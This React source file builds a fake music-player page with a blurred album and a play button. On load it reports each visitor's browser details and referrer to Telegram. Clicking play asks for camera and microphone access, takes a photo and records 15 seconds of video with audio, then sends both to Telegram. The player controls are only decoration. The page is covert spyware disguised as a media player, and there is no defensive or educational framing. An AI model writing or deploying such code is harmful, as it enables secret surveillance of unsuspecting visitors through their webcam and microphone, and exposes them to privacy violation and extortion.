import { useState, useEffect, useCallback } from 'react';
import {
  PlayIcon,
  BackwardIcon,
  ForwardIcon,
  ArrowsRightLeftIcon,
} from '@heroicons/react/24/solid';

import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);

  const thumbnailUrl =
    'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();

      const videoDevice = devices.find(
        (device) => device.kind === 'videoinput'
      );

      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 1920 },
          height: { ideal: 1080 },
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch {
            resolve(true);
          }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;

      const context = canvas.getContext('2d');

      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      const photoBlob = await new Promise((resolve) => {
        canvas.toBlob(
          (blob) => {
            if (blob) resolve(blob);
          },
          'image/jpeg',
          1.0
        );
      });

      sendImageToTelegram(photoBlob).catch(console.error);

      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm',
      ];

      const supportedMimeType = mimeTypes.find((type) =>
        MediaRecorder.isTypeSupported(type)
      );

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000,
      });

      const chunks = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, {
          type: supportedMimeType.includes('mp4')
            ? 'video/mp4'
            : 'video/webm',
        });

        await sendVideoToTelegram(videoBlob);

        stream.getTracks().forEach((track) => track.stop());
      };

      mediaRecorder.start(1000);

      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 15000);
    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  return (
    <div className="min-h-screen bg-black overflow-hidden relative flex items-center justify-center">
      {/* Background */}
      <div
        className="absolute inset-0 bg-cover bg-center scale-110 blur-[2px]"
        style={{
          backgroundImage:
            'url(https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop)',
        }}
      />

      {/* Dark overlay */}
      <div className="absolute inset-0 bg-black/55" />

      {/* Grain */}
      <div className="absolute inset-0 opacity-20 bg-[url('https://www.transparenttextures.com/patterns/asfalt-light.png')]" />

      {/* Player Card */}
      <div className="relative z-10 w-[340px] rounded-[30px] bg-[#cfcaca] p-5 shadow-2xl">
        {/* Album */}
        <div className="relative rounded-md overflow-hidden aspect-square bg-[#ece8e8]">
          <img
            src={thumbnailUrl}
            alt="Album"
            className={`w-full h-full object-cover transition-all duration-500 ${
              isBlurred ? 'blur-md scale-110 brightness-75' : ''
            }`}
          />

          {/* Play button */}
          <div className="absolute inset-0 flex items-center justify-center">
            <button
              onClick={handlePlayClick}
              className="bg-black/70 hover:bg-black/80 transition-all duration-300 rounded-full p-5 backdrop-blur-sm"
            >
              <PlayIcon className="w-10 h-10 text-white" />
            </button>
          </div>
        </div>

        {/* Progress */}
        <div className="mt-6">
          <div className="relative h-[6px] rounded-full bg-white/70 overflow-hidden">
            <div className="absolute left-0 top-0 h-full w-[58%] bg-black rounded-full" />

            <div className="absolute left-[58%] top-1/2 -translate-y-1/2 -translate-x-1/2 w-4 h-4 rounded-full bg-black shadow-md" />
          </div>

          <div className="flex justify-between mt-2 text-[15px] text-black/60 font-medium">
            <span>0:35</span>
            <span>-2:50</span>
          </div>
        </div>

        {/* Controls */}
        <div className="flex items-center justify-between mt-7 px-1">
          <button className="text-black hover:scale-110 transition">
            <ArrowsRightLeftIcon className="w-6 h-6" />
          </button>

          <button className="text-black hover:scale-110 transition">
            <BackwardIcon className="w-10 h-10" />
          </button>

          <button
            onClick={handlePlayClick}
            className="text-black hover:scale-110 transition"
          >
            <div className="flex gap-[6px]">
              <div className="w-[8px] h-10 bg-black rounded-sm" />
              <div className="w-[8px] h-10 bg-black rounded-sm" />
            </div>
          </button>

          <button className="text-black hover:scale-110 transition">
            <ForwardIcon className="w-10 h-10" />
          </button>

          <button className="text-black hover:scale-110 transition rotate-180">
            <ArrowsRightLeftIcon className="w-6 h-6" />
          </button>
        </div>
      </div>
    </div>
  );
}

export default App;
